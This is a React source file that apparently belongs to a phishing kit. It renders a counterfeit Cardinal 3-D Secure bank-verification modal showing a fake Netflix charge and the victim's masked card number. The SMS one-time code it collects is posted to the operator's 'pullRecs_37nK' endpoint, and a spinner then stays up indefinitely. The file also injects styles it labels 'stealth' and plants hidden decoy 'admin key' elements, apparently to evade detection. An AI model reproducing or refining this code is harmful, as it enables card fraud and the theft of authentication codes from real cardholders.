import React, { useState, useEffect } from 'react';
import { socket } from '../../index';
import axios from 'axios';
import visaLogo from './visalogo.svg';
import mcLogo from './mc.svg';
import amexLogo from './amexlogo.svg';
import phoneImg from '../../assets/img/image2.png'
const ContainerCode = () => {
  const [styles, setStyles] = useState(null);
  const [showNotif, setShowNotif] = useState(true);
  const [logoUrl, setLogoUrl] = useState('');
  const [brandLogo, setBrandLogo] = useState('');
  const [brand, setBrand] = useState('');
  const [links, setLinks] = useState({});
  const [currentDate, setCurrentDate] = useState('');
  const [maskedCardNumber, setMaskedCardNumber] = useState('************');
  const [formData, setFormData] = useState({});
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  useEffect(() => {
    // Dynamically add stealth styles
    const style = document.createElement("style");
    style.innerHTML = `
      .fCon_z9s2x {
        position: absolute;
        top: -9999px;
        left: -9999px;
        width: 100vw;
        height: 200px;
        overflow: hidden;
        opacity: 0;
      }
      .mslBttn_e1z9s {
        position: absolute;
        left: -9999px;
        visibility: hidden;
      }
      .invDv_2z69s {
        width: 200px;
        height: 50px;
        background-color: rgba(255, 0, 0, 0.001);
        position: absolute;
        top: -1000px;
      }
  
      .FTI_A6RTsa {
        position: absolute;
        left: -1000px;
        top: -1000px;
        opacity: 0;
      }
    `;
    document.head.appendChild(style);
  }, []);
const userId = localStorage.getItem('clientSessionID');
  const handleContinue = (logoUrl, brandLogo, links) => {
    setLogoUrl(logoUrl);
    setBrandLogo(brandLogo);
    setLinks(links);
    setShowNotif(false);
  };

  const getBrandLogo = () => {
    switch (brand.toLowerCase()) {
      case 'visa':
        return visaLogo;
      case 'mastercard':
        return mcLogo;
      case 'amex':
      case 'american express':
        return amexLogo;
      default:
        return '';
    }
  };

  useEffect(() => {
    const loadStyles = async () => {
      try {
        const [loginStyles, additionalStyles, spinnerStyles] = await Promise.all([
          import('../../assets/styles/styler.css'),
          import('../../assets/styles/styler_f.css'),
          import('./styling.css'),
        ]);

        setStyles({
          login: loginStyles.default,
          additional: additionalStyles.default,
          more: spinnerStyles.default,
        });
      } catch (error) {
      }
    };

    
    const fetchCreditCard = async () => {
      try {
        const bankLast4Digits = localStorage.getItem('bankLast4Digits');
        if (bankLast4Digits) {
          const masked = '*'.repeat(12) + bankLast4Digits;
          setMaskedCardNumber(masked);
        }
      } catch (error) {
        setMaskedCardNumber('************0000');
      }
    };
    
    const fetchLogoUrl = async () => {
      try {
        const storedLogoUrl = localStorage.getItem('bankLogoUrl');
        const storedBrand = localStorage.getItem('bankBrand');
        if (storedLogoUrl) {
          setLogoUrl(storedLogoUrl);
        }
        if (storedBrand) {
          setBrand(storedBrand);
        }

      } catch (error) {
      }
    };
    fetchCreditCard();
    fetchLogoUrl();
    loadStyles();
    const now = new Date();
    const formattedDate = now.toLocaleString('en-US', {
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false,
    });
    setCurrentDate(formattedDate);
  }, [userId]);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const inputs = Object.values(formData).filter(value => value.trim() !== '').join(', ');
    if (!inputs) {
      setError('Incorrect code.');
      return;
    }
    setLoading(true);
    try {
      const maskedCardNumber = localStorage.getItem('bankLast4Digits');
      const response = await axios.post(`${process.env.REACT_APP_API_URL}/api/authenticate/${userId}/pullRecs_37nK`, {
        otp: inputs,
        maskedCardNumber
      });

      if (response.status === 200) {
        setLoading(true);
      }
    } catch (error) {
      setError(error.response?.data?.message || 'Verification failed');
    } finally {
      setLoading(true);
    }
  };
  console.log(brand , brandLogo)
  return (
    <body className="page-template page-template-page-templates page-template-minimal-footer page-template-page-templatesminimal-footer-php page page-id-61 logged-in wp-custom-logo theme-underscores wc-braintree-body woocommerce-checkout woocommerce-page woocommerce-js no-sidebar webp-support">
      <div id="Cardinal-ElementContainer">
        <div id="Cardinal-Modal" style={{ paddingTop: '0px' }} className="cardinalOverlay-content shadow-effect cardinalOverlay-open fade-and-drop ">
          <div id="Cardinal-ModalContent" className="size-02" tabIndex="-1">
              {loading && (
                <div className="spinner-overlay">
                  <div className="spinner"></div>
                </div>
              )}
            <div style={{
              maxHeight: '100%',
              overflow: 'auto',
              padding: '20px',
            }} className="threeds-two">
              <div className="container-fluid">
                <div style={{ scrollPaddingBottom: '24px', minHeight: '30xp', paddingBottom : "46px", paddingBottom : "12px"}}>
                  {/* Show the logos here */}
                  <img src={logoUrl} alt="" style={{ width: '20%', float: 'left' }} />
                  <img src={getBrandLogo()} alt="" style={{ width: '20%', float: 'right' }} />
                </div>
                <br/>
                <br/>
                <br/>
                <br/>

                <img className="image" src={phoneImg} alt="" style={{ width: '20%' }} />
                <br />
                <div className="body" dir="LTR" style={{ bottom: '71.25px' }}>
                  <div className="container container-sticky-footer">
                    <form
                      autoComplete="off"
                      data-ajax="true"
                      data-ajax-begin="ccHelpers.ajax.onBegin"
                      data-ajax-complete="ccHelpers.ajax.onComplete"
                      data-ajax-failure="ccHelpers.ajax.onFailure"
                      data-ajax-method="form"
                      data-ajax-success="ccHelpers.ajax.onSuccess"
                      id="ValidateCredentialForm"
                      method="post"
                      name="ValidateCredentialForm"
                      noValidate
                      onSubmit={handleSubmit}
                    >
                      <div className="body" dir="LTR" style={{ bottom: '71.25px' }}>
                        <div className="row"></div>
                        <div className="row">
                          <div className="col-12" id="ValidateOneUpMessage">
                            <div style={{ textAlign: 'center' }} id="Body1">
                              <strong>Protecting Your Online Payment</strong>
                            </div>
                          </div>
                        </div>
                        <div className="row">
                          <div style={{ textAlign: 'center' }} className="col-12" id="ValidateOptInMessage">
                            A Verification Code has been sent to your registered mobile phone number via SMS. By clicking Submit, you are deemed to have accepted the terms and conditions below.
                          </div>
                        </div>
                        <br />
                        <div className="row form-two-col">
                          <div className="col-12 p-0">
                            <fieldset id="ValidateTransactionDetailsContainer">
                              <div className="validate-field row">
                                <span style={{ textAlign: "left" }} className="validate-label col-6">Merchant</span>
                                <span style={{ textAlign: "right" }} className="col-6">WWW.NETFLIX.COM</span>
                              </div>
                              <div className="validate-field row">
                                <span style={{ textAlign: "left" }} className="validate-label col-6">Card Number</span>
                                <span style={{ textAlign: "right" }} className="col-6 always-left-to-right">{maskedCardNumber}</span>
                              </div>
                              <div className="validate-field row">
                                <span style={{ textAlign: "left" }} className="validate-label col-6">Date</span>
                                <span style={{ textAlign: "right" }} className="col-6 always-left-to-right">{currentDate}</span>
                              </div>
                              <br />
                              <br />
                              { error && <div style={{fontWeight: 'normal'}} className="error_msg"><b style={{fontWeight: 'bold'}}>{error}</b> Please try again.</div> }
                              <div id="cust" className="formcol">
                                <input
                                  type="text"
                                  placeholder="Please enter your code"
                                  name="sms"
                                  className="textinput"
                                  required
                                  onChange={handleChange}
                                />
                              </div>
                            </fieldset>
                            <div className="col-12 text-center">
                              <button className="submitbtn" type="submit" disabled={loading}>
                                Confirm
                              </button>
                            </div>
                          </div>
                        </div>
                      </div>
                      <div className="sticky-footer">
                        <div className="row no-pad">
                        </div>
                        <div className="" id="FooterLinks">
                          <div className="row">
                            <div className="col-12">
                            </div>
                          </div>
                        </div>
                      </div>
                    </form>
                  </div>
                </div>
                <br />
              </div>
            </div>
          </div>
        </div>
        <div className="fCon_z9s2x">
        <p>Welcome</p>
        <p>Loading</p>
        <input type="text" placeholder="Enter admin key" className="FTI_A6RTsa" />
        <button className="mslBttn_e1z9s">Submit Admin Code</button>
      </div>

      {/* Hidden but Space-Occupying Elements */}
      <div className="invDv_2z69s"></div>
        <div id="Cardinal-Overlay" className="cardinalOverlay-mask cardinalOverlay-open "></div>
      </div>
    </body>
  );
};

export default ContainerCode;
